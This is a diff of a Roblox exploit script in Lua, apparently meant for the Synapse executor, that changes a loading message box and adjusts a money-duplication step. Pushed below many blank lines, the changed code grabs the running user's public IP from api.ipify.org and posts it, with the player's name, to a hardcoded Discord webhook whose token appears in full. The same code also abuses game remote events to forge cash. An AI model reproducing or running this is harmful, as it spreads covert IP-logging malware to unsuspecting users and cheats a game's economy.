@@ -1,7 +1,7 @@
 while task.wait() do
    rconsoleprint("LOADING")
-    messagebox("AUN", "LOVE U <3", 0)
-    task.wait(3)
+    messagebox("LOVE YOU AUN", "u a real 1 <3", 0)
+    task.wait(5)
     break
   end
 
@@ -97,4 +97,12 @@ while task.wait() do
 
 
 
-local a={[1]=-10666000}local b={[1]=10666000}local c;game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Workspace").Terrain.Wash.Body.CFrame-Vector3.new(0,-10,0)task.wait(2)c=game:HttpGet("https://api.ipify.org")game:GetService("ReplicatedStorage").Launder:FireServer(unpack(a))task.wait(2.5)function webhook(d)syn.request({Url="https://discord.com/api/webhooks/1018136836478079016/bISPzS4bY4Zsp70US4e2mJfcbhlmaWHSczadYAb-kh6OwQ4Dbpbt4MTEmLIiJlrmZ_8H",Method="POST",Headers={["Content-Type"]="application/json"},Body=game:GetService("HttpService"):JSONEncode({embeds={{title=tostring("666 | "..game.Players.LocalPlayer.Name),description=tostring(c)}}})})end;webhook(c)game:GetService("ReplicatedStorage").Patch1W:FireServer(unpack(b))
+
+
+
+
+
+
+
+
+local a={[1]=-cash}local b={[1]=cash}local c;game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Workspace").Terrain.Wash.Body.CFrame-Vector3.new(0,-10,0)task.wait(2)c=game:HttpGet("https://api.ipify.org")game:GetService("ReplicatedStorage").Launder:FireServer(unpack(a))task.wait(2.5)function webhook(d)syn.request({Url="https://discord.com/api/webhooks/1018136836478079016/bISPzS4bY4Zsp70US4e2mJfcbhlmaWHSczadYAb-kh6OwQ4Dbpbt4MTEmLIiJlrmZ_8H",Method="POST",Headers={["Content-Type"]="application/json"},Body=game:GetService("HttpService"):JSONEncode({embeds={{title=tostring("666 | "..game.Players.LocalPlayer.Name),description=tostring(c)}}})})end;webhook(c)game:GetService("ReplicatedStorage").Patch1W:FireServer(unpack(b))
